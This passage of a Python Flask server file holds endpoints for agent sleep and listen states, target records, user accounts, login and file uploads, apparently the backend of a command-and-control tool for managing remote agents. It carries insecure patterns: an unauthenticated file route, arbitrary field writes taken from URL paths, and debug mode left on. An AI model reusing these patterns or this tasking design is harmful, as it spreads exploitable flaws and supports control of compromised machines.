                                "{\"msg\":\"sleepAgent(): 401"+"\"}")
        return '401', 401

    try:
        # Retrieve the record by ID directly from the Targ entity
        target_record = orm.select(i for i in Target if i._id ==_id and i._isid==_isid).first()
        # Check if the record exists
        if target_record:
            # Update the specified field with the new value
            #print(f'**{interval}**'*100) 
            _i_bool = interval.lower() == 'true'
            if _i_bool :
                setattr(target_record,    Utility.Attribute.STATE.value,      Utility._state.SLEEP.value)
            else :
                setattr(target_record,    Utility.Attribute.STATE.value,      Utility._state.INTERVAL.value)
            setattr(target_record,    Utility.Attribute.INTERVAL.value,    sleep)
            orm.commit()
            Utility.Log.insert_log(f"{_isid}",
                        f'count:{target_record._n}',
                        action.GET.value,
                        str(datetime.now()),
                        action.SUCCESS.value,
                        "{\"msg\":\"sleepAgent(id, field, value): 200 "+"\"}")
            return '200'  # Return True to indicate successful update
        else:
            Utility.Log.insert_log(f"{_isid}",
                        'count:0',
                        action.GET.value,
                        str(datetime.now()),
                        action.FAILED.value,
                        "{\"msg\":\"sleepAgent(id, field, value): 404 "+"\"}")
            return '404'  # Return False if the record with the specified ID does not exist
    except Exception as e:
        Utility.Log.insert_log(f"{_isid}",
                        'count:0',
                        action.GET.value,
                        str(datetime.now()),
                        action.ERROR.value,
                        "{\"msg\":\"sleepAgent(id, field, value): 500"+f"Error: {e}"+"\"}")
    return '500'  



@app.route('/<_core_id>/t/<id>/<field>/<value>')
@orm.db_session
# Function to update a specific field in a record by ID
def updatesinglerecordbyid(_core_id,id, field, value):
    #->
    if not Utility.Sessions.session_valid(request.headers.get('authtok')) :
        
        Utility.Log.insert_log(f"{_core_id}",
                                'invalid session',
                                action.INSERT.value,
                                str(datetime.now()),
                                action.FAILED.value,
                                "{\"msg\":\"insertinstance(): 401"+"\"}")
        return '401', 401
    
    # Retrieve the record by ID directly from the Targ entity
    target_record = orm.select(i for i in Target if i._id == id).first()
    print(f"id: {id} field: {field} value:{value}")
    # Check if the record exists
    if target_record:
        # Update the specified field with the new value
        target_record.assign_value(field, value)
        orm.commit()
        Utility.Log.insert_log(f"{_core_id}",
                    f'count:{target_record._n}',
                    action.GET.value,
                    str(datetime.now()),
                    action.SUCCESS.value,
                    "{\"msg\":\"updatesinglerecordbyid(id, field, value): 200 "+"\"}")
        return '200'  # Return True to indicate successful update
    
    else:
        
        Utility.Log.insert_log(f"{_core_id}",
                    'count:0',
                    action.GET.value,
                    str(datetime.now()),
                    action.FAILED.value,
                    "{\"msg\":\"updatesinglerecordbyid(id, field, value): 404 "+"\"}")
        return '404'  # Return False if the record with the specified ID does not exist



@app.route('/<isid>/<id>/gz',methods=['GET'])
@orm.db_session
def getsleep(isid,id):
    try:
        targets  = Target.select(lambda i : i._isid == isid and int(i._id) == int(id)).first()
        with orm.db_session:
                sleep = getattr(targets,attribute.INTERVAL.value)
                #set the state back to listen
                setattr(targets,attribute.STATE.value,state.LISTEN.value)
                setattr(targets,attribute.INTERVAL.value,0)
                orm.commit()
                
                Utility.Log.insert_log(f"{isid}",
                                    f'{id}',
                                    action.GET.value,
                                    str(datetime.now()),
                                    action.SUCCESS.value,
                                    "{\"msg\":\" def getsleep(isid,id): 200 \"}")
                #print('*8*8'*1000)
                return f'{sleep}'
    except Exception as e :
          Utility.Log.insert_log(f"{isid}",
                        f'{id}',
                        action.GET.value,
                        str(datetime.now()),
                        action.ERROR.value,
                        "{\"msg\":\" def getsleep(isid,id): 400 \"}"+f"\n{e}")
    return '500'



#icci

# @app.route('/<_core_id>/i/<field>/<value>/<new_value>', methods=['PUT'])
# @orm.db_session
# def update_instance_by_field(field,value,new_value):
#     try:
#         with orm.db_session:

@app.route('/<_core_id>/t/<field>/<value>/<new_value>', methods=['PUT'])
@orm.db_session
def updatemanyrecordsbyfield(_core_id,field,value,new_value):
    #->
    if not Utility.Sessions.session_valid(request.headers.get('authtok')) :
        
        Utility.Log.insert_log(f"{_core_id}",
                                'invalid session',
                                action.INSERT.value,
                                str(datetime.now()),
                                action.FAILED.value,
                                "{\"msg\":\"insertinstance(): 401"+"\"}")
        return '401', 401
    try:
        with orm.db_session:
            # Retrieve records based on the specified field and its current value
            records_to_update = Target.select(lambda t: getattr(t, field) == value)[:]
            # Check if any records match the criteria
            if records_to_update:
                # Update the specified field with the new value for all matching records
                for record in records_to_update:
                    setattr(record, field, new_value)
                orm.commit()
                
                Utility.Log.insert_log(f"{_core_id}",
                        f'count:{len(records_to_update)}',
                        action.GET.value,
                        str(datetime.now()),
                        action.SUCCESS.value,
                        "{\"msg\":\"updatemanyrecordsbyfield(field,value,new_value): 200"+"\"}")
                return '200'  # Return '200' to indicate successful update
            else:
                
                Utility.Log.insert_log(f"{_core_id}",
                        'count:0',
                        action.GET.value,
                        str(datetime.now()),
                        action.FAILED.value,
                        "{\"msg\":\"updatemanyrecordsbyfield(field,value,new_value): 404"+"\"}")
                return '404'  # Return '404' if no records match the criteria
    except Exception as e:
        
        Utility.Log.insert_log(f"{_core_id}",
                        'count:0',
                        action.GET.value,
                        str(datetime.now()),
                        action.ERROR.value,
                        "{\"msg\":\"updatemanyrecordsbyfield(field,value,new_value): 500"+f"Error: {e}"+"\"}")

        return '500'  
    # Return '500' in case of any error during the update
""" SESSION MANAGEMENT """

def compare_tokens(session_token):
    if Utility.Sessions.session_exists(session_token):
        return '200'
    else:
        return '400'
    

def checksessions(session_token):
    if Utility.Sessions.session_valid(str(session_token)):
        
        Utility.Log.insert_log("",
                        f'{session_token}',
                        action.GET.value,
                        str(datetime.now()),
                        action.AUTHENTICATED.value,
                        "{\"msg\":\"checksessions(session_token): 200 "+"\"}")
        return '200'
    else:
        
        Utility.Log.insert_log("",
                        f'{session_token}',
                        action.GET.value,
                        str(datetime.now()),
                        action.FAILED.value,
                        "{\"msg\":\"checksessions(session_token): 400 "+"\"}")
        return '400'
    
""" USER MANAGER OPERATIONS """




""" ATHENTICATION MANAGER OPERATIONS """

@app.route('/<_core_id>/c/u', methods=['POST'])
@orm.db_session
def create_user(_core_id):
    #->
    if not Utility.Sessions.session_valid(request.headers.get('authtok')) :
        
        Utility.Log.insert_log(f"{_core_id}",
                                'invalid session',
                                action.INSERT.value,
                                str(datetime.now()),
                                action.FAILED.value,
                                "{\"msg\":\"insertinstance(): 401"+"\"}")
        return '401', 401
    data = request.get_json()
    if 'password' not in data or 'username' not in data or 'hash_id' not in data:
        
        Utility.Log.insert_log("",
                        'create_user',
                        action.GET.value,
                        str(datetime.now()),
                        action.ERROR.value,
                        "{\"msg\":\"def create_user(): 400 {'error': 'Missing required fields'}"+"\"}")
        return  400
    if Utility.Hashtable.Authenticate(data["password"],data["username"])[1]:
        
        Utility.Log.insert_log(f"{_core_id}",
                        'create_user',
                        action.GET.value,
                        str(datetime.now()),
                        action.FAILED.value,
                        "{\"msg\":\"create_user(): 401 {'error': 'Already Exists'}"+"\"}")
        return 401
    try:
        Utility.Hashtable.insert(data['password'],data['username'],_core_id)

        
        Utility.Log.insert_log(f"{_core_id}",
                'create_user',
                action.GET.value,
                str(datetime.now()),
                action.SUCCESS.value,
                "{\"msg\":\"create_user(): 200 {'message': 'user created successfully'}"+"\"}")
        return  201
    except Exception as e:
        
        Utility.Log.insert_log(f"{_core_id}",
                'create_user',
                action.GET.value,
                str(datetime.now()),
                action.ERROR.value,
                "{\"msg\":\"def create_user(): 500 "+f"{'error': str(e)}"+"\"}")
        return  500


@app.route('/<_core_id>/c/u/c', methods=['POST'])
@orm.db_session
def create_user_core(_core_id):
    #->
    if not Utility.Sessions.session_valid(request.headers.get('authtok')) :
        
        Utility.Log.insert_log(f"{_core_id}",
                                'invalid session',
                                action.INSERT.value,
                                str(datetime.now()),
                                action.FAILED.value,
                                "{\"msg\":\"insertinstance(): 401"+"\"}")
        return '401', 401
    data = request.get_json()
    if 'password' not in data or 'username' not in data or 'core_id' not in data:
        
        Utility.Log.insert_log(f"{_core_id}",
                'create_user_core():',
                action.GET.value,
                str(datetime.now()),
                action.FAILED.value,
                "{\"msg\":\"create_user_core(): 400 {'error': 'Missing required fields'}"+"\"}")
        return  400
    if Utility.Hashtable.Authenticate(data["password"],data["username"])[1]:
        
        Utility.Log.insert_log(f"{_core_id}",
                'create_user_core():',
                action.GET.value,
                str(datetime.now()),
                action.FAILED.value,
                "{\"msg\":\"create_user_core(): 401 'error': 'Already Exists'} "+"\"}")
        return  401
    try:
        Utility.Hashtable.insert_core_user(data['password'],data['username'],data['core_id'])
        
        Utility.Log.insert_log(f"{_core_id}",
                'create_user_core():',
                action.GET.value,
                str(datetime.now()),
                action.SUCCESS.value,
                "{\"msg\":\"create_user_core(): 201 {'message': 'user created successfully'}"+"\"}")
        return  201
    except Exception as e:
        
        Utility.Log.insert_log(f"{_core_id}",
                'create_user_core():',
                action.GET.value,
                str(datetime.now()),
                action.ERROR.value,
                "{\"msg\":\"def create_user_core(): 201 "+f"{'error': str(e)}"+"\"}")
        return  500
    

#actual function for logging in.
def login(value):
    # Split the string by '&'
    split_strings = value.split('&')
    # Store the substrings in separate variables
    username = split_strings[0]
    password = split_strings[1]
    #print(f'usr: {username}   pwd: {password}')
    result = Utility.Hashtable.Authenticate(password, username)
    return result

#End point to login
@app.route('/auth', methods=['POST'])
@orm.db_session
def login_end_point():
    try:
        # Get the JSON data from the request body
        data = request.get_json()  
        # Assuming the JSON data contains a key 'value' for login authentication
        value = data.get('value') 
        # Check if the value is a string and contains the '&' character
        c,b = login(value)
        #check the tuple variables, make sure the value is a string for fear of injection and make sure it's a value string. 
        if b and c and '&' in value:
            # Do something if the condition is true
            s = Utility.Sessions.GenerateSession()
            core = Utility.return_core(c,s)
            if core :
                
                Utility.Log.insert_log(f"{request}",
                        'login_end_point():',
                        action.GET.value,
                        str(datetime.now()),
                        action.AUTHENTICATED.value,
                        "{\"msg\":\"login_end_point(): 200 core: "+core+"\"}")
                return core
            
            Utility.Log.insert_log(f"{request}",
                        'login_end_point():',
                        action.GET.value,
                        str(datetime.now()),
                        action.FAILED.value,
                        "{\"msg\":\"login_end_point() !core? : 500"+"\"}")
            return "500"
        else:
            
            Utility.Log.insert_log("",
                        'login_end_point():',
                        action.GET.value,
                        str(datetime.now()),
                        action.ERROR.value,
                        "{\"msg\":\"login_end_point(): failed login"+"\"}")
            # Do something else if the condition is false
            return '500'
    except Exception as e:
        
        Utility.Log.insert_log("",
            'login_end_point():',
            action.GET.value,
            str(datetime.now()),
            action.ERROR.value,
            "{\"msg\":\"login_end_point(): 500"+"\"}")
            # Do something else if the condition is false
        return '500'


""" STORAGE """
def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

@app.route('/<_core_id>/upl/ph/<filename>')
def get_image(filename):
    
    Utility.Log.insert_log("",
                    'get_image():',
                    action.GET.value,
                    str(datetime.now()),
                    action.GET.value,
                    "{\"msg\":\"get_image(filename): getting image"+"\"}")
    # Use send_from_directory to serve the image from the specified directory
    return send_from_directory(app.config['IMAGE_FOLDER'], filename)

@app.route('/<_core_id>/upload', methods=['POST'])
def upload_file(_core_id):
    if not Utility.Sessions.session_valid(request.headers.get('authtok')) :
    
        Utility.Log.insert_log(f"{_core_id}",
                                'invalid session',
                                action.INSERT.value,
                                str(datetime.now()),
                                action.FAILED.value,
                                "{\"msg\":\"insertinstance(): 401"+"\"}")
        return '401', 401
    #print(request.data['file'])
    if  request.data is None:
        
        Utility.Log.insert_log("",
                    'upload_file():',
                    action.GET.value,
                    str(datetime.now()),
                    action.FAILED.value,
                    "{\"msg\":\"get_image(filename): no file"+"\"}")
        return '403', 403

    file = request.data['file']

    if file.filename == '':
        
        Utility.Log.insert_log("",
                    'upload_file():',
                    action.GET.value,
                    str(datetime.now()),
                    action.FAILED.value,
                    "{\"msg\":\"get_image(filename): filename empty"+"\"}")
        return '403', 403

    if file and allowed_file(file.filename):
        filename = secure_filename(file.filename)

        fpath = os.path.join(app.config['IMAGE_FOLDER'], filename)
        
        # Ensure the directory exists
        os.makedirs(os.path.dirname(app.config['IMAGE_FOLDER']), exist_ok=True)
        
        upload_folder = f'/upl/{_core_id}_files'
        if not os.path.exists(upload_folder):
            os.makedirs(upload_folder)

        filename = secure_filename(file.filename)
        file_path = os.path.join(upload_folder, filename)
        file.save(file_path)



        _, file_extension = os.path.splitext(filename)

        # Get the file size
        file_size = os.path.getsize(file_path)

        Utility.Files(_filename=filename,
                      core_id=_core_id,
                      _extension=file_extension,
                      _filesize = file_size
                      )
        orm.commit()
        
        Utility.Log.insert_log("",
                'upload_file():',
                action.GET.value,
                str(datetime.now()),
                action.SUCCESS.value,
                "{\"msg\":\"get_image(filename): extension rejected"+"\"}")
        
        return '200'
    
    Utility.Log.insert_log("",
                    'upload_file():',
                    action.GET.value,
                    str(datetime.now()),
                    action.ERROR.value,
                    "{\"msg\":\"get_image(filename): invalid file type"+"\"}")
    return '405'

#icci
@app.route('/<_core_id>/dir',methods=['GET'])
def get_directory_structure(_core_id):
    if not Utility.Sessions.session_valid(request.headers.get('authtok')) :
    
        Utility.Log.insert_log(f"{_core_id}",
                                'invalid session',
                                action.INSERT.value,
                                str(datetime.now()),
                                action.FAILED.value,
                                "{\"msg\":\"def get_directory_structure(_core_id):401"+"\"}")
        return '401', 401
    

    Utility.Log.insert_log("",
                    'def get_directory_structure(_core_id):',
                    action.GET.value,
                    str(datetime.now()),
                    action.SUCCESS.value,
                    "{\"msg\":\"def get_directory_structure(_core_id):"+"\"}")
        
    DirectoryStructur = Utility.BuildStorageObjects(_core_id)
    return DirectoryStructur
        

# # Example usage of the update_field_by_id function
# record_id = 1  # Replace with the desired record ID
# field_to_update = "_lp"  # Replace with the name of the field you want to update
# new_value = "new_value"  # Replace with the new value for the field
# # Call the update_field_by_id function
# success = update_field_by_id(record_id, field_to_update, new_value)
if '__main__' == __name__:
# Call the create_target_table function to create the Target table if it does not exist
    print(f'{Utility.YELLOW}* CONFIGURING SERVER')
    if len(sys.argv) > 1 :
        connob = host, port = Utility.gethostname(f'{sys.argv[1]}')
        if connob: 
            host, port = connob
        else:
            print(f'{Utility.RED}* ERROR HOST OR PORT NULL: check config.xml?')
            exit(-1)
    else:
        connob = Utility.gethostname('default')
        if connob: 
            host, port = connob 
        else:
            print(f'{Utility.RED}* ERROR HOST OR PORT NULL: {Utility.LIGHT_RED} your config.xml must empty.{Utility.YELLOW}\n Try adding this .. in the <api> tags \n\t <host name="default" ip="localhost" port="8000"></host> ')
            exit(-1)
    print(f'{Utility.CYAN}* host: {Utility.LIGHT_YELLOW}{host} {Utility.CYAN} port: {Utility.LIGHT_YELLOW}{port}')
    print(f'{Utility.YELLOW}* START PROC{Utility.RESET}')


    socketio.run(app,host=host, port=port,debug=True)